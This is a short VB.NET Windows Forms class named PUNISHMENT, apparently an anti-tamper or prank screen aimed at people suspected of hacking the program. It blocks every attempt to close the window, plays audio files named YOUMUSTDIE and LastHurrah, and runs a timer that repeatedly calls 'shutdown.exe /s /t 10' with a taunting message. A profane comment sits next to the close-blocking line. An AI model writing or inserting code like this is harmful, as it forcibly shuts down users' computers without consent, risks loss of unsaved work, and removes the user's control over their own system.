Public Class PUNISHMENT

    Private Sub PUNISHMENT_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True ' F**K YOU For Hack Code.....

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Process.Start("shutdown.exe", "/s /t 10 /c How dare..")
    End Sub

    Private Sub PUNISHMENT_Shown(sender As Object, e As EventArgs) Handles Me.Shown
        My.Application.DoEvents()
        My.Computer.Audio.Play(My.Resources.YOUMUSTDIE, AudioPlayMode.WaitToComplete)
        My.Computer.Audio.Play(My.Resources.LastHurrah, AudioPlayMode.Background)
        Timer1.Enabled = True
    End Sub
End Class